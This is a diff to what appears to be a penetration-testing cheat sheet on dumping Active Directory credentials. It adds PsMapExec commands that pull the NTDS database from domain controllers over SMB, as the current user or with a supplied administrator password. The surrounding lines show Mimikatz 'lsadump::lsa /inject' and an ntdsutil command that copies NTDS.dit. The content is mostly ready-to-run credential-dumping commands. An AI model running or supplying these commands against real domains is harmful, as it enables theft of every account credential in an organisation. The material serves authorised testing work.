@@ -36,6 +36,17 @@
 
     Invoke-Mimikatz -command '"lsadump::lsa /inject"'
 
+### PsMapExec
+
+##### As current user
+
+    PsMapExec -Targets DCs -Method SMB -Module NTDS
+
+##### As a specified user
+
+    PsMapExec -Targets DCs -Method SMB -Module NTDS -Username Administrator -Password Password123!
+
+
 ### NTDSUtil
 
  - ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q (On the DC)
